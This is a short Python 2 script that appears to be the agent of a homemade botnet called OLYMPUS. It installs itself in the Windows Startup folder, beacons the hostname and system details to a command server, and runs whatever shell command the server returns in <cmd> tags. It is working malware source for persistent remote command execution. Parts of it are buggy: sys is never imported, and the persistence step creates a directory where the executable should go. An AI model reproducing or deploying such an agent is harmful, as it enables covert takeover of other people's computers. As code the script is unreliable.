import requests #library to make requests
import socket# used to get hostname
import platform #used to get system information
import datetime# library to get system time
import subprocess
import time#time
import re#regex
import time #used for sleep()
import os
import shutil

#Get webpage content
#resp = urllib2.urlopen('http://localhost/ONI/index.php?')
#page = resp.read()
#print page

#Make post request ex:send ID
def get_date():
    currentDT = datetime.datetime.now()
    return str(currentDT)

def get_hostname():
    hostname = socket.gethostname() #sending bot id
    return hostname

if __name__ == "__main__":
    currentDT = datetime.datetime.now()
    while 1:
        persist_dir = os.path.join(os.getenv('APPDATA'), "\Microsoft\Windows\Start Menu\Programs\Startup\OLYMPUS.exe")
        if not os.path.exists(persist_dir):
             os.makedirs(persist_dir)
             agent_path = os.getenv('APPDATA') + "\Microsoft\Windows\Start Menu\Programs\Startup\OLYMPUS.exe" #Get shell:startup path
             shutil.copyfile(sys.executable, agent_path)
             print '[+] Agent installed.'
        params = {'id': get_hostname(),'sys_info': platform.platform(), "last_seen" : currentDT}
        response = requests.post('http://localhost/OLYMPUS/cmd.php', params=params)
            #print response.content
        str = re.findall("<cmd>(.*?)</cmd>", response.content) #html output of the page after sending HTTP POST request
            #print str[0] #command to be executed
        cmd = str[0]
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)#execute shell
        out, err = process.communicate()#get cmd output
        print(out)
        time.sleep(10) #sleep so it doesn't make CPU usage go skyrocket
